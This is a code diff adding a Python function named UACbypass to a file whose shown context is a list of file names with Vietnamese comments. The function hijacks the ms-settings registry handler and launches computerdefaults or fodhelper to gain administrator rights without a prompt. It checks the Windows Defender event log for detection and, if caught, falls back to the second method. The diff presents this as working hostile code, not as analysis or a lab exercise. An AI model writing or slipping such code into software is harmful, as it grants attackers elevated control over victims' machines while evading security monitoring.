@@ -47,6 +47,48 @@ import random
 import shutil
 from urllib3 import PoolManager
 
+def UACbypass(method: int = 1) -> bool: # Tries to bypass UAC prompt and get administrator permissions (exe mode)
+        if Utility.GetSelf()[1]:
+        
+            execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
+        
+            match method:
+                case 1:
+                    execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
+                    execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
+                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+                    execute("computerdefaults --nouacbypass")
+                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+                    execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+
+                    if log_count_after > log_count_before:
+                        return Utility.UACbypass(method + 1)
+
+                case 2:
+
+                    execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
+                    execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
+                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+                    execute("fodhelper --nouacbypass")
+                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+                    execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+
+                    if log_count_after > log_count_before:
+                        return Utility.UACbypass(method + 1)
+                case _:
+                    return False
+            
+            return True
+        
+class Utility:
+
+    @staticmethod
+    def GetSelf() -> tuple[str, bool]: # Returns the location of the file and whether exe mode is enabled or not
+        if hasattr(sys, "frozen"):
+            return (sys.executable, True)
+        else:
+            return (__file__, False)
+
 
 # Danh sách tên file
 file_names = [
